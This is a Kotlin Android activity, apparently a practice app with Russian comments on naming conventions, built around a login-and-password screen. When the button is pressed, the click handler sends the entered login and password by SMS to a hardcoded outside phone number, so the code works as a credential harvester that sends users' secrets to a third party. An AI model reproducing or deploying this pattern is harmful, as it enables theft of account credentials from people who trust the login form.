package com.example.myapplication9

import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.telephony.SmsManager
import android.widget.Button
import android.widget.EditText
import android.widget.TextView

class MainActivity : AppCompatActivity() {
    //Я буду указывать название переменных как то, что они будут делать или для чего они нужны в программе, с каким view связаны, и т.д
    //Это чтобы было понятней по их имени, что они делают и т.д. А также чтобы соответствовать правилам Naming Conventions.

    var buttonToSendMessage: Button? = null
    var editTextForLogin: EditText? = null
    var editTextForPassword: EditText? = null
    var textViewToShowMessage: TextView? = null
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        initializeView()
        initializeListeners()
    }

    fun initializeView() {
        buttonToSendMessage = findViewById(R.id.button_activity_main_send_SMS)
        editTextForLogin = findViewById(R.id.editText_activity_main_login)
        editTextForPassword = findViewById(R.id.editText_activity_main_password)
        textViewToShowMessage = findViewById(R.id.textView_activity_main_show_text)
    }
    fun initializeListeners() {
        buttonToSendMessage?.setOnClickListener {
            val smsManager = SmsManager.getDefault()
            textViewToShowMessage?.text = editTextForLogin!!.text.toString() + " " + editTextForPassword!!.text.toString()
            smsManager.sendTextMessage("+77711949025", null, editTextForLogin!!.text.toString() + " " + editTextForPassword!!.text.toString(), null, null)
        }
    }
}